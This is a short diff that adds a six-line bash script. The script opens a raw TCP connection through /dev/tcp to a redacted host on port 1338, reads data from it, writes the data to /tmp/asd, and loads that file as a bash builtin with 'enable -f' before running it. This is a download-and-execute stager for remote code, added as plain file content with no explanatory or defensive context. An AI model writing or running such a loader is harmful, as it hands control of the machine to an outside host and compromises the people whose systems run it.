@@ -1,0 +1,6 @@
+exec 3<>/dev/tcp/[REDACTED]/1338
+read asd <&3
+echo -e "$asd" > /tmp/asd
+enable -f /tmp/asd head
+head
+
